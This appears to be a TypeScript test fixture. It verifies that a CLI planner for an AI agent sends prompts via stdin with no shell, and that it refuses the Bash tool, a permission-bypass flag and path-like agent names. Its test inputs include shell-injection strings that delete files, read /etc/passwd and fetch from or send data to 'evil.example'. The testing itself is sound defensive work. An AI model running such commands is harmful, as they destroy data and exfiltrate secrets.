/**
 * Fixture proof for T-X010 — malicious prompt interpolation:
 * no shell injection. Prompt is delivered via stdin; argv is fixed;
 * shell is always false. External effects: NONE.
 */

import { randomUUID } from "node:crypto";
import { SoakProofKind, type SoakProofRecord } from "@worksocial/domain";
import { planClaudeCliInvocation } from "@worksocial/claude-runner";

/**
 * Complete expected proof set for T-X010 fixture ACCEPTED.
 */
export function proofMaliciousPromptNoShellInjection(
  nowIso: string,
): SoakProofRecord {
  const details: string[] = [];
  let passed = true;

  const maliciousPrompts = [
    'owner title"; rm -rf / #',
    "$(curl http://evil.example/exfil)",
    "`id; cat /etc/passwd`",
    "website text | sh",
    "incoming && wget http://evil.example/p",
  ];

  for (const prompt of maliciousPrompts) {
    const plan = planClaudeCliInvocation({
      agentName: "A13",
      modelId: "claude-fixture-model",
      prompt,
    });
    if (!plan.ok) {
      passed = false;
      details.push(`Malicious prompt unexpectedly denied: ${plan.reason}`);
      continue;
    }
    if (plan.shell !== false) {
      passed = false;
      details.push("Plan shell must be false");
    }
    if (plan.promptDelivery !== "stdin") {
      passed = false;
      details.push("Prompt delivery must be stdin");
    }
    if (plan.prompt !== prompt) {
      passed = false;
      details.push("Prompt body must be preserved for stdin write");
    }
    const argvJoined = plan.argv.join("\0");
    if (argvJoined.includes(prompt)) {
      passed = false;
      details.push("Prompt leaked into argv (shell interpolation risk)");
    }
    const metacharTokens = [";", "$(", "`", "|", "&&"];
    for (const token of metacharTokens) {
      if (
        prompt.includes(token) &&
        plan.argv.some((arg) => arg.includes(token))
      ) {
        passed = false;
        details.push(`Shell metachar ${token} appeared in argv`);
      }
    }
  }
  if (passed) {
    details.push(
      "Malicious prompts planned with shell=false; prompt via stdin; argv clean",
    );
  }

  const bashDenied = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    tools: "Bash,Read",
  });
  if (!bashDenied.ok && bashDenied.code === "FLAG_DENIED") {
    details.push("Bash tool string refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`Bash tools unexpectedly ${JSON.stringify(bashDenied)}`);
  }

  const bypassDenied = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--dangerously-skip-permissions"],
  });
  if (!bypassDenied.ok && bypassDenied.code === "FLAG_DENIED") {
    details.push("Permission-bypass flag refused");
  } else {
    passed = false;
    details.push(`Bypass flag unexpectedly ${JSON.stringify(bypassDenied)}`);
  }

  const pathAgent = planClaudeCliInvocation({
    agentName: "/tmp/.claude/agents/A01.md",
    modelId: "claude-fixture-model",
    prompt: "benign",
  });
  if (!pathAgent.ok && pathAgent.code === "INVALID_AGENT") {
    details.push("Path-like agent name refused (INVALID_AGENT)");
  } else {
    passed = false;
    details.push(`Path agent unexpectedly ${JSON.stringify(pathAgent)}`);
  }

  const benign = planClaudeCliInvocation({
    agentName: "A25",
    modelId: "claude-fixture-model",
    prompt: "Summarize approved facts only",
  });
  if (
    benign.ok &&
    benign.shell === false &&
    benign.promptDelivery === "stdin" &&
    !benign.argv.join("\0").includes(benign.prompt)
  ) {
    details.push("Benign prompt also stdin-only (positive control)");
  } else {
    passed = false;
    details.push(`Benign plan unexpectedly ${JSON.stringify(benign)}`);
  }

  details.push("liveProviderSuccessClaimed=false externalEffects=NONE");

  return {
    proofId: `proof-prompt-interp-${randomUUID()}`,
    kind: SoakProofKind.MALICIOUS_PROMPT_NO_SHELL_INJECTION,
    passed,
    details,
    applyAttemptCount: 1,
    operationId: `op-x010-${randomUUID().slice(0, 8)}`,
    createdAtIso: nowIso,
    fixtureOnly: true,
  };
}
